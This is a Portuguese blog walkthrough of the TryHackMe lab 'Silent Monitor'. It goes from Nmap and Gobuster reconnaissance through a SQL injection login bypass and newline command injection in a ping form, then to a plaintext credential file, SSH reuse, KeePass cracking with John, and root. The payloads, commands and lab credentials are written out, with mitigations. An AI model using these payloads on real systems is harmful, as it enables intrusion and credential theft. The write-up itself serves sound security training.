---
layout: post
title: "Silent Monitor — SQLi, Command Injection e KeePass até root"
description: "Walkthrough da room Silent Monitor (TryHackMe): enumeração Flask, bypass de login por SQLi, RCE com quebra de linha, credenciais expostas, SSH, KeePass e acesso root."
date: 2026-11-04
categories: [walkthrough]
tags: [linux, tryhackme, silent-monitor, nmap, gobuster, sql-injection, flask, command-injection, rce, ssh, keepass, john, credential-reuse, privilege-escalation]
---

# Silent Monitor — SQLi, Command Injection e KeePass até root

Mais uma room Linux do **TryHackMe**. O cenário era um portal interno de monitoramento da CorpNet, aparentemente normal, mas com uma cadeia de falhas que permitia sair de uma página web e chegar a **root**.

O mais interessante desta room foi a interação com o login: consegui entrar no painel usando **SQL Injection**, sem conhecer a senha. Depois, uma ferramenta legítima de ping se tornou o caminho para executar comandos no servidor.

> **Aviso:** laboratório autorizado do TryHackMe. Os endereços e as credenciais citados são do ambiente descartável da room.

## Técnicas exploradas

| Técnica | Onde apareceu | Resultado |
|---|---|---|
| **SQL Injection (SQLi)** | Login em `/internal` | Bypass da autenticação |
| **Command Injection → RCE** | Host Health / `ping` | Comandos como `www-data` |
| **Sensitive Information Disclosure** | `secret.config` | Senha da conta `sysadmin` |
| **Credential Reuse** | Serviço de backup → SSH | Acesso como `sysadmin` |
| **Offline Password Cracking** | Banco KeePass `.kdbx` | Senha mestra recuperada com John |
| **Privilege Escalation por credenciais** | Senha de `root` no KeePass | `su -` e `uid=0(root)` |

## Índice

1. [Ambiente e cadeia de exploração](#ambiente)
2. [Nmap e enumeração de diretórios](#recon)
3. [SQLi no login e sessão Flask](#sqli)
4. [Dashboard e pistas no Audit Log](#dashboard)
5. [Command Injection pelo ping](#command-injection)
6. [Arquivos e senha exposta](#arquivos)
7. [SSH como sysadmin e flag de usuário](#ssh)
8. [SCP, KeePass e John the Ripper](#keepass)
9. [Escalonamento para root](#root)
10. [Erros, mitigações e checklist](#checklist)
11. [Referências e posts relacionados](#referencias)

<a id="ambiente"></a>

## 1. Ambiente e cadeia de exploração

Os IPs mudaram após o reset da VM. Nos comandos abaixo, utilizo uma variável para que o guia funcione independentemente do IP recebido.

| Serviço | Descoberta |
|---|---|
| Sistema | Ubuntu Linux |
| `22/tcp` | OpenSSH 8.9p1 |
| `5050/tcp` | Werkzeug 2.0.2 / Python 3.10.12 |
| Aplicação | CorpNet NOC v2.4.1 |
| Usuário da aplicação | `netops` / `operator` |
| Usuário da execução web | `www-data` (UID 33) |
| Usuário SSH | `sysadmin` (UID 1001) |
| Objetivo final | `root` (UID 0) |

~~~text
Nmap → HTTP :5050 → Gobuster → /internal
                         |
                         v
                  SQLi no login
                         |
                         v
                   Dashboard netops
                         |
                         v
             Host Health → %0A → RCE
                         |
                    www-data
                         |
                         v
               /opt/netops/secret.config
                         |
              credencial de sysadmin
                         |
                         v
                   SSH sysadmin
                         |
                         v
             backups/infrastructure.kdbx
                         |
              keepass2john + John
                         |
                  senha "spring"
                         |
                         v
               KeePass → senha root
                         |
                         v
                       su -
                         |
                    uid=0(root)
~~~

<a id="recon"></a>

## 2. Reconhecimento: portas e diretórios

Comecei identificando os serviços expostos.

**Comando usado:**

~~~bash
TARGET=10.66.172.155
nmap -sV -sC "$TARGET"
~~~

- `-sV`: identifica versões dos serviços.
- `-sC`: executa os scripts padrão do Nmap.

Resultado relevante:

~~~text
22/tcp   open  ssh   OpenSSH 8.9p1 Ubuntu
5050/tcp open  http  Werkzeug httpd 2.0.2 (Python 3.10.12)
http-title: CorpNet — Network Operations Centre
~~~

O SSH solicitava credenciais, então comecei pela aplicação HTTP na porta **5050**:

~~~bash
curl -i "http://$TARGET:5050/"
~~~

O HTML apresentava apenas uma página institucional de monitoramento. Usei o Gobuster para procurar caminhos não exibidos no menu:

~~~bash
gobuster dir -u "http://$TARGET:5050/" -w dir.txt -x php,txt,bak,old,zip -t 10
~~~

- `-w`: wordlist.
- `-x`: extensões adicionais.
- `-t 10`: dez requisições simultâneas.

Encontrei `/internal`, que mostrava um formulário de login. Repeti a enumeração nesse caminho:

~~~bash
gobuster dir -u "http://$TARGET:5050/internal" -w dir.txt -x php,txt,bak,old,zip -t 10
~~~

| Endpoint | Resposta sem sessão |
|---|---|
| `/internal` | `200`, login |
| `/internal/dashboard` | `302`, redirecionamento ao login |
| `/internal/health` | `302`, redirecionamento ao login |
| `/internal/logout` | `302`, limpa a sessão |

A aplicação não fornecia detalhes úteis antes da autenticação. O próximo teste foi diretamente no formulário.

<a id="sqli"></a>

## 3. SQL Injection no login

No **Burp Suite Repeater**, interceptei a requisição `POST /internal`. O formulário enviava os campos `username` e `password` como `application/x-www-form-urlencoded`.

Testei um bypass clássico no campo de usuário, deixando a senha vazia:

~~~text
username=' OR 1=1;-- &password=
~~~

Por partes:

- `'`: tenta encerrar a string da consulta SQL.
- `OR 1=1`: adiciona uma condição sempre verdadeira.
- `--`: inicia um comentário SQL, neutralizando o restante da consulta em dialetos compatíveis.
- `password=`: campo enviado vazio.

> **Importante:** não li a consulta SQL original. Esta é a explicação do mecanismo provável; a prova do bypass veio do comportamento da aplicação.

**Resposta observada:**

~~~http
HTTP/1.0 302 FOUND
Location: http://10.67.188.150/internal/dashboard
Set-Cookie: session=eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.aujj5A.lKT_9sMnnfSBzUg4ItqwzUdxaDw; HttpOnly; Path=/
~~~

Recebi uma sessão e fui redirecionado para o dashboard. Também confirmei o acesso digitando o payload diretamente no navegador.

### 3.1 O cookie Flask não é um JWT

O cookie tinha **três componentes**, em um formato compatível com a sessão assinada do Flask:

~~~text
payload.timestamp.assinatura
~~~

Ao decodificar a primeira parte Base64URL, encontrei:

~~~json
{"role":"operator","user":"netops"}
~~~

**Base64 não é criptografia:** é possível ler esses dados sem conhecer uma chave. A assinatura é o que permite ao servidor detectar alterações.

Tentei modificar manualmente o cookie, mas não consegui assumir outra identidade: alterar o payload invalida a assinatura. Um cookie de sessão do Flask **não é a mesma coisa que um JWT**, embora ambos possam conter dados codificados e assinados.

Também fiz um login comum com `netops` e uma senha de teste. Ele falhou, enquanto a SQLi criou uma sessão válida: mais uma evidência do bypass.

### 3.2 Por que o Burp redirecionou para a porta errada?

Minha requisição no Burp continha:

~~~http
Host: 10.67.188.150
~~~

Mas a aplicação estava na porta **5050**. O servidor montou o `Location` sem essa porta, e seguir o redirecionamento não abriu o painel corretamente.

O cabeçalho adequado seria:

~~~http
Host: 10.67.188.150:5050
~~~

Com o cookie original, abri diretamente:

~~~text
http://<target>:5050/internal/dashboard
~~~

**Lição:** um `302` com `Set-Cookie` pode indicar login bem-sucedido, mesmo que o navegador não siga corretamente a URL informada em `Location`. Precisamos conferir **host, porta, cookie e resposta**, não apenas a página exibida.

**Mitigação:** consultas parametrizadas (*prepared statements*), validação de autenticação no backend e tratamento seguro de sessões.

<a id="dashboard"></a>

## 4. Dashboard: serviços internos e Audit Log

Dentro do painel, encontrei **Host Health**, **Audit Log** e uma lista de serviços. Duas informações chamaram atenção:

| Serviço | Endereço mostrado | Observação |
|---|---|---|
| SSH Daemon | `0.0.0.0:22` | Acessível externamente |
| NOC API | `0.0.0.0:5050` | Aplicação web |
| SNMP Collector | `127.0.0.1:161` | Vinculado ao loopback, conforme painel |
| Backup Agent | `127.0.0.1:8812` | Apontado como agente de backup |
| Syslog Collector | `0.0.0.0:514` | Painel indicava timeout |

No Audit Log apareceram usuários como `jmartin`, `netops` e `svc-mon`. Mais interessante: havia registros antigos de testes com estes valores:

~~~text
127.0.0.1%0awhoami
127.0.0.10%awhoami
~~~

Pareciam tentativas de **Command Injection com quebra de linha**. A função Host Health executava um ping e exibia o comando usado:

~~~bash
ping -c 2 -W 1 127.0.0.1
~~~

- `-c 2`: envia dois pacotes ICMP.
- `-W 1`: aguarda até um segundo pela resposta de cada pacote.

Essa funcionalidade era o próximo ponto de entrada.

<a id="command-injection"></a>

## 5. Command Injection: da ferramenta de ping à RCE

Primeiro tentei inserir outros comandos diretamente no campo de hostname:

~~~text
127.0.0.1;id
127.0.0.1%0Aid
127.0.0.1%id
~~~

Não funcionaram desse modo no navegador. O teste com `%id` foi interpretado como parte de um hostname, e o formulário também aplicava validação de entrada.

Voltei ao **Burp Repeater** e enviei o valor **URL-encoded** diretamente no parâmetro do formulário:

~~~http
POST /internal/health HTTP/1.1
Host: <target>:5050
Content-Type: application/x-www-form-urlencoded
Cookie: session=<cookie_valido>

target=127.0.0.1%0Aid
~~~

**O que acontece aqui?**

- `%0A` representa o caractere de nova linha (*line feed*, LF).
- Ao decodificar o corpo `application/x-www-form-urlencoded`, a aplicação recebe uma **quebra de linha real** entre o IP e `id`.
- Se esse valor é interpolado em um comando de shell sem proteção, a quebra de linha separa duas instruções.

O comando efetivo se comportou como:

~~~bash
ping -c 2 -W 1 127.0.0.1
id
~~~

Na resposta, além dos resultados do ping, apareceu:

~~~text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

**RCE confirmada**: consegui executar comandos arbitrários como `www-data`, usuário do processo web.

### 5.1 Por que `%0A` funcionou no Burp, mas não no navegador?

Ao digitar literalmente `%0A` no campo do navegador, o formulário normalmente codifica o próprio símbolo `%` como `%25`:

~~~text
Campo digitado: 127.0.0.1%0Aid
Valor enviado:  target=127.0.0.1%250Aid
~~~

Após uma decodificação, o servidor recebe os caracteres literais `%0A`, não a quebra de linha. No Burp consegui controlar o corpo enviado para que chegasse exatamente `%0A`.

Essa diferença entre **codificação no cliente** e **decodificação no servidor** foi a parte mais instrutiva do exploit.

A validação também não era consistente: um payload maior, incluindo `curl -sS -i -m 3 ... 2>&1`, retornou **Invalid hostname or IP address**. Não identifiquei o código responsável por essa validação, então não é possível afirmar se havia um regex específico ou um limite de caracteres.

### 5.2 Enumeração como www-data

Depois do `id`, testei comandos curtos no Burp:

~~~text
target=127.0.0.1%0Ahostname
target=127.0.0.1%0Apwd
target=127.0.0.1%0Als
~~~

Resultados:

~~~text
hostname → tryhackme-2204
pwd      → /opt/netops
ls       → app.py  netops.db  secret.config  templates
~~~

Também tentei `sudo -l` nessa execução remota e recebi a mensagem sobre o sinalizador **no new privileges**. É uma restrição do contexto do processo web; **não significa** que todas as contas da máquina possuam a mesma limitação.

**Mitigação:** evitar concatenar entrada do usuário em comandos de shell. Para realizar ping, preferir APIs com argumentos separados e `shell=False`, além de validar rigorosamente o destino. Apenas filtrar `;` é insuficiente quando outros separadores, como nova linha, são interpretados pelo shell.

<a id="arquivos"></a>

## 6. Permissões Linux e credenciais expostas

Em `/opt/netops`, encontrei estas permissões:

~~~text
drwxrwx---  root     www-data  /opt/netops
-rw-r--r--  root     root      app.py
-rw-rw----  www-data www-data  netops.db
-rw-r-----  root     www-data  secret.config
drwxr-x---  root     www-data  templates/
~~~

O arquivo mais importante foi `secret.config`. Seu grupo era **www-data** e as permissões eram `-rw-r-----`. Portanto, embora o proprietário fosse `root`, o processo web conseguia **ler** o arquivo.

**Como interpretar `-rw-r-----`?**

| Campo | Valor | Significado |
|---|---|---|
| Tipo | `-` | Arquivo comum |
| Dono | `rw-` | Leitura e escrita |
| Grupo | `r--` | Leitura |
| Outros | `---` | Nenhum acesso |

No diretório `drwxrwx---`, o grupo `www-data` tem `rwx`: pode listar, atravessar e modificar entradas conforme as regras do diretório. No arquivo `secret.config`, basta a permissão de leitura do grupo para ocorrer o vazamento.

Ao ler o arquivo, encontrei:

~~~ini
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!
~~~

A configuração mencionava uma **conta de serviço do agente de backup** e trazia a senha em texto puro.

O painel mostrava também `127.0.0.1:8812` como endereço do Backup Agent. Tentei consultá-lo com `curl` pela RCE, mas não obtive uma resposta útil; **não confirmei exploração desse serviço**. A senha já era suficiente para avançar.

**Mitigação:** não manter credenciais em arquivos legíveis pelo usuário do servidor web; usar armazenamento de segredos, separar permissões e impedir login interativo de contas de serviço quando desnecessário.

<a id="ssh"></a>

## 7. SSH como sysadmin e flag de usuário

Voltei à AttackBox e testei a credencial encontrada contra o SSH:

~~~bash
ssh sysadmin@$TARGET
~~~

Usei a senha do `secret.config` e o acesso funcionou:

~~~text
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
/home/sysadmin
~~~

Isso é **Credential Reuse**: uma senha guardada para a conta do agente de backup também permitia login SSH como `sysadmin`. A configuração `run_as`, isoladamente, não provaria isso; confirmei com autenticação real.

Verifiquei os privilégios:

~~~bash
sudo -l
~~~

Resultado:

~~~text
Sorry, user sysadmin may not run sudo on tryhackme-2204.
~~~

Fiz uma enumeração simples de SUID e arquivos graváveis:

~~~bash
find /usr/bin /usr/local/bin -perm -4000 -type f 2>/dev/null
find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
~~~

- `-perm -4000`: procura arquivos com o bit SUID.
- `-writable`: procura arquivos em que a conta atual pode escrever.
- `-printf '%p\n'`: exibe o caminho.
- `2>/dev/null`: oculta erros de permissão.

Não apareceu um SUID personalizado claramente explorável. Mas a busca revelou uma pasta de backups.

A flag de usuário estava em `/home/sysadmin/user.txt`:

~~~bash
cat ~/user.txt
~~~

~~~text
THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
~~~

<a id="keepass"></a>

## 8. SCP, KeePass e quebra da senha mestra

No diretório `/home/sysadmin/backups`:

~~~text
-rw-r--r-- sysadmin sysadmin README.txt
-rw------- sysadmin sysadmin infrastructure.kdbx
~~~

O README descrevia um arquivo de exportação de credenciais:

~~~text
infrastructure.kdbx — KeePass credential database
~~~

### 8.1 O que é KeePass / KDBX?

**KeePass** é um gerenciador de senhas que armazena entradas em um banco criptografado, geralmente com extensão `.kdbx`. **KeePassXC** é uma implementação compatível, com interface gráfica e ferramentas de terminal.

A extensão `.kdbx` **não significa que a senha pode ser simplesmente lida com `cat`**. É preciso desbloquear o banco com sua senha mestra e, quando configurados, outros fatores como arquivos-chave.

### 8.2 Copiar o banco com SCP

Já com acesso SSH, copiei o arquivo para a AttackBox:

~~~bash
scp sysadmin@$TARGET:/home/sysadmin/backups/infrastructure.kdbx .
~~~

O **SCP (Secure Copy)** transfere arquivos usando SSH. No comando:

- `sysadmin@$TARGET:`: conta e servidor de origem.
- `/home/sysadmin/backups/infrastructure.kdbx`: caminho remoto.
- `.`: diretório atual da AttackBox.

Na primeira conexão, o SSH solicitou confirmação da chave do host (fingerprint). Em ambientes reais, essa impressão digital deve ser verificada por uma fonte confiável antes de aceitá-la.

### 8.3 Extrair o hash com keepass2john

O programa `keepass2john` converte os dados de verificação do KeePass para um formato que o **John the Ripper** entende. Ele **não descriptografa** o banco sozinho.

~~~bash
keepass2john infrastructure.kdbx > keepass.hash
~~~

Depois, testei uma wordlist:

~~~bash
john --wordlist=rockyou.txt keepass.hash
~~~

Resultado:

~~~text
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
spring (infrastructure)
1 password hash cracked
~~~

Para conferir a senha encontrada:

~~~bash
john --show keepass.hash
~~~

~~~text
infrastructure:spring
~~~

**Aprendizado:** o banco era criptografado, mas a senha mestra `spring` era fraca e estava na wordlist. A proteção criptográfica não compensa uma senha facilmente adivinhável.

### 8.4 Usar o KeePassXC pelo terminal

Com a senha mestra, listei o conteúdo:

~~~bash
keepassxc-cli ls infrastructure.kdbx
~~~

Apareceu uma entrada chamada **Root User Password - Sensitive**.

Minha primeira tentativa com `"NomeDaEntrada"` falhou porque aquilo era apenas um placeholder. O caminho deve coincidir com o nome real da entrada.

Comando para mostrar os detalhes, incluindo campos protegidos:

~~~bash
keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive"
~~~

Para consultar especificamente o atributo da senha:

~~~bash
keepassxc-cli show -s -a Password infrastructure.kdbx "Root User Password - Sensitive"
~~~

| Comando | Função |
|---|---|
| `keepassxc-cli ls` | Lista grupos e entradas |
| `keepassxc-cli show` | Exibe os dados de uma entrada |
| `-s` | Mostra campos protegidos, como senhas |
| `-a Password` | Seleciona somente o atributo `Password` |

Também abri o banco na interface gráfica do KeePassXC e confirmei que a entrada correspondia ao usuário **root**.

<a id="root"></a>

## 9. De sysadmin para root

Com a senha de `root` recuperada do KeePass, voltei à sessão SSH do `sysadmin` e executei:

~~~bash
su -
~~~

O `su` (*substitute user*) troca a identidade da sessão após a autenticação. Sem informar um usuário, o padrão é `root`; o `-` solicita um ambiente de login desse usuário.

A senha armazenada no KeePass funcionou:

~~~bash
whoami
id
~~~

~~~text
root
uid=0(root) gid=0(root) groups=0(root)
~~~

**Root confirmado.** Neste caso, a escalada não exigiu explorar o `sudo`, um binário SUID nem o cron: foi uma cadeia de **exposição de credenciais + senha mestra fraca + uso da senha de root**.

> **Flag final:** o acesso a `root` foi confirmado, mas o conteúdo de `/root/root.txt` não foi registrado nas anotações desta execução. Não vou inventar uma flag.

<a id="checklist"></a>

## 10. O que não funcionou, mitigações e checklist

### Tentativas e lições

| Teste | Resultado | Aprendizado |
|---|---|---|
| Login comum `netops` | Credenciais inválidas | O acesso veio da SQLi, não de uma senha conhecida |
| Alterar cookie Flask | Sessão não passou a valer | Base64 é legível, mas a assinatura protege integridade |
| Seguir `302` do Burp | Porta 5050 ausente no `Location` | Conferir `Host`, porta e URL final |
| `127.0.0.1;id` no campo | Não executou | Validação ou formato de envio pode bloquear o separador |
| `%0A` digitado no navegador | Não executou como esperado | Codificação do formulário é diferente da requisição manual |
| `%0A` no POST pelo Burp | `id` executado | Newline pode funcionar como separador no shell |
| Payload `curl` mais longo | `Invalid hostname or IP address` | O filtro não aceita todas as entradas |
| `sudo -l` como `sysadmin` | Negado | Buscar outros caminhos, não presumir sudo |
| KeePass com nome genérico | Entrada não encontrada | `show` exige o título/caminho real |

### Checklist reutilizável

| Etapa | O que verificar | Proteção recomendada |
|---|---|---|
| Reconhecimento | Portas, versões, paths, `301/302/403` | Reduzir serviços e rotas expostas |
| Login | Entradas SQL, cookies, redirects | Prepared statements e sessões seguras |
| Dashboard | Logs, endpoints e serviços internos | Privilégios mínimos e segregação |
| Funções de diagnóstico | Ping, traceroute, shell e validação | Não usar `shell=True` com entrada externa |
| Pós-RCE | `id`, `pwd`, `ls -la`, configurações | Permissões e gestão de segredos |
| Contas | Senhas reutilizadas entre serviços e SSH | Senhas únicas e sem login em contas de serviço |
| Escalonamento | `sudo -l`, SUID, arquivos e backups | Menor privilégio e auditoria de permissões |
| Cofres de senhas | KDBX, senha mestra, arquivos-chave | Senha mestra forte e proteção dos backups |

O ponto principal desta room foi observar **como uma vulnerabilidade levava à próxima**: SQLi abriu o painel, o painel expôs o ping, o ping forneceu execução remota, e a execução remota revelou uma senha reutilizada. O KeePass não foi quebrado por uma falha do programa, mas pela fragilidade da **senha mestra**.

> **Dica final:** em labs descartáveis do TryHackMe, não foi necessário executar uma etapa de limpeza para encerrar a VM. Em testes persistentes, documente e remova artefatos adicionados durante a exploração.

<a id="referencias"></a>

## 11. Referências e posts relacionados

- [NexusCorp — Do Recon ao Root](https://redp4w.github.io/notes/nexuscorp-do-recon-ao-root/) — outra cadeia de acesso web, RCE e SSH.
- [Linux Privilege Escalation — Cron, SUID e LD_PRELOAD](https://redp4w.github.io/notes/linux-cron-suid-ld-preload/) — outras formas de chegar a root.
- [Criando Wordlists](https://redp4w.github.io/notes/criando-wordlists/) — dicionários utilizados em ataques de senha.
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [KeePassXC CLI — Manual](https://github.com/keepassxreboot/keepassxc/blob/develop/docs/man/keepassxc-cli.1.adoc)
- [John the Ripper](https://www.openwall.com/john/)
